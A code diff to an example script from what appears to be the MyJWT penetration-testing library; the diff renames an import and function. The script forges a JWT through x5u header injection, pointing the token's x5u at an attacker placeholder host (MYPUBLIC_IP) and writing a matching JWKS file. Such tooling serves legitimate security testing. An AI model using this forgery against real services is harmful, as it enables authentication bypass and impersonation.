@@ -1,4 +1,4 @@
-from MyJWT.vulnerabilities import x5uVulnerability
+from myjwt.vulnerabilities import x5u_vulnerability
 
 jwt = (
     "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly90ZXN0LmNvbSJ9.eyJ1c2VyIjoiaGFja2VyIn0.Z57BGf-BW"
@@ -7,7 +7,7 @@ jwt = (
     "AHKGHUAI0eXJoJ7Sq3sDrjZ9_THTiHSwQQYFnlIbIcFKuANdExuhG-tmIhfa6-8Zu_RELLL6UzgL2G-yu021B_Hm9YmwuXewtDktXKY"
     "uWofo-PVFUUWVSEw7gIAw"
 )
-newJwt = x5uVulnerability(jwt=jwt, url="MYPUBLIC_IP")
+newJwt = x5u_vulnerability(jwt=jwt, url="MYPUBLIC_IP")
 # optionals param crt, pem (check documentation).
 # this function will create a new json file for your new jwks (named: jwks_with_x5c.json)
 print(jwt)
